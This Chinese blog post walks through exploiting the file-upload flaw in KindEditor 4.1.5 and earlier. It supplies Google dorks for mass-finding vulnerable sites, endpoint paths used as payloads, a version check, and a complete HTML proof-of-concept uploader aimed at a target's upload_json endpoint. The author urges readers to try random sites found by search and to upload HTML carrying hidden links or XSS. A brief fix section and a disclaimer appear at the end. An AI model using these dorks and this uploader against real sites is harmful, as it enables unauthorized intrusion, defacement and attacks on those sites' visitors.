# 原创
：  漏洞挖掘 | 编辑器漏洞之kindeditor

# 漏洞挖掘 | 编辑器漏洞之kindeditor

今天呢给大家复现一个kindeditor&lt;=4.1.5上传漏洞。小弟能力有限，还在坚持学习的路上，还请大佬多多指教。自我感觉编辑器漏洞很容易忽视。此文章作为记录本人学习的开始，丰富自己的阅历。我们共同进步。

### 0x00 漏洞描述

一定要注意是版本小于4.1.5。可能现在同学会问我怎么看版本，后边我悄悄告诉你。漏洞主要是存在于kindeditor编辑器里。通过编辑器你能上传.txt和.html文件。并且此漏洞的优势在于使用语言广泛，支持php/asp/jsp/asp.net。

这里html里面可以嵌套暗链接地址以及嵌套xss。Kindeditor上的uploadbutton.html用于文件上传功能页面，直接POST到/upload_json.*?dir=file，在允许上传的文件扩展名中包含htm,txt：extTable.Add(“file”,”doc,docx,xls,xlsx,ppt,htm,html,txt,zip,rar,gz,bz2”)

简单理解：就是可以通过poc间接性的上传文件。uploadbutton.html直接指向/upload_json.*?dir=file不懂没关系，后边看我实战就ok了。

### 0x01 批量搜索

找漏洞最必要的还是批量，别人借助工具，咱们借助谷歌。批量可以节省你大部分的时间。那么此时的你一定在关心谷歌语法吧。下边给大家列举一下。

`inurl:/examples/uploadbutton.html<br/> inurl:/php/upload_json.php<br/> inurl:/asp.net/upload_json.ashx<br/> inurl://jsp/upload_json.jsp<br/> inurl://asp/upload_json.asp`

我们以其中一条为例进行谷歌搜索一下

看吧，这是以其中一条语法搜索的啊<br/> 这些所有的链接都尝试一遍，找出的漏洞积分在漏洞盒子上不了榜？我信你个鬼。<br/> 好了，开个玩笑，我说到这，剩下的交给你们。

### 0x02 漏洞条件

要想挖掘漏洞一定要有一个可以产生漏洞的条件。这个大家都可以理解，那kindeditor编辑器的漏洞需要什么条件呢。

1.首先一定要看脚本语言，对症下药。kindeditor编辑器支持php/asp/jsp/asp.net，payload给你们放下边。

`/asp/upload_json.asp<br/> /asp.net/upload_json.ashx<br/> /jsp/upload_json.jsp<br/> /php/upload_json.php`

检查的目的就是验证文件 upload_json.* 存在不存在（漏洞描述中有讲过为什么）

2.查看可目录变量是否存在那种脚本上传漏洞，这个不懂没关系，看我后边操作。这里同样给你们检测的payload。

`kindeditor/asp/upload_json.asp?dir=file<br/> kindeditor/asp.net/upload_json.ashx?dir=file<br/> kindeditor/jsp/upload_json.jsp?dir=file<br/> kindeditor/php/upload_json.php?dir=file`

根据web容器选择合适的payload。

### 0x03 漏洞复现

1.Google hacking搜索漏洞点。以其中一条语法为例

2.这么多网站随便点一个呗。

<br/> 点进去之后发现是上传点，大概你第一眼想到的就是文件上传漏洞，当然这里存不存在我没试过，你可以尝试一下。

3.悄悄的告诉你如何查看版本。

`http://www.xxx.com/kindeditor/kindeditor.js`

对，就这！不信你看图。

<br/> 很显然，4.1.4版本，在我们的掌控中。

4.验证文件 upload_json.* 是否存在（上边方法有列举）<br/> 这里呢可以通过分析网站结构来查看脚本语言，我这里用的插件<br/>  

<br/> 可以看到web服务器是IIS，那就猜想asp的站嘛，当然如果你不想分析，一共4条你挨个试一下嘛，访问一下看看<br/>  

<br/> 很明显，存在。

5.今天的武器就是前辈创造的poc。这里需要修改&lt;script&gt;…&lt;script&gt;以及url : 的内容,根据实际情况修改.

`&lt;html&gt;&lt;head&gt;<br/> &lt;title&gt;Uploader&lt;/title&gt;<br/> &lt;script src="http://www.xxx.com/kindeditor//kindeditor.js"&gt;&lt;/script&gt;<br/> &lt;script&gt;<br/> KindEditor.ready(function(K) {<br/> var uploadbutton = K.uploadbutton({<br/> button : K('#uploadButton')[0],<br/> fieldName : 'imgFile',<br/> url : 'http://www.xxx.com/kindeditor/jsp/upload_json.jsp?dir=file',<br/> afterUpload : function(data) {<br/> if (data.error === 0) {<br/> var url = K.formatUrl(data.url, 'absolute');<br/> K('#url').val(url);}<br/> },<br/> });<br/> uploadbutton.fileBox.change(function(e) {<br/> uploadbutton.submit();<br/> });<br/> });<br/> &lt;/script&gt;&lt;/head&gt;&lt;body&gt;<br/> &lt;div class="upload"&gt;<br/> &lt;input class="ke-input-text" type="text" id="url" value="" readonly="readonly" /&gt;<br/> &lt;input type="button" id="uploadButton" value="Upload" /&gt;<br/> &lt;/div&gt;<br/> &lt;/body&gt;<br/> &lt;/html&gt;`

6.做一个html，用浏览器打开看一下。

<br/> 7.这里呢要配合一下抓包，需要看一下返回地址。我上传一个txt文件，看一下

8.我们访问一下文件看看。

成功了。当然这了可以传很多格式，上边有介绍。比如这里传一个html里面可以嵌套暗链接地址以及嵌套xss。

### 0x04 漏洞修复

1.直接删除upload_json.**和file_manager_json.**

2.升级kindeditor到最新版本

### 0x05 总结

可能手法比较老，毕竟也不能否定他的存在。渗透测试的核心讲究测试嘛。希望这篇文章对一直探索的我们有所帮助。

   申明：本账号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法。

###### **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/2f74894cf8e04b7f87d9716681f6e26b.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/5b4209eac3784bd18f5e1cd6a5157e4e.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/4a89b0c2a52a4f569a970e55dcbac0b4.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/4f211474c8ab4a5a910884e1d3423310.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/54c2816350ae4bf787d1c6eec0d4e837.png" width="665"/>

应急响应笔记

学习路线
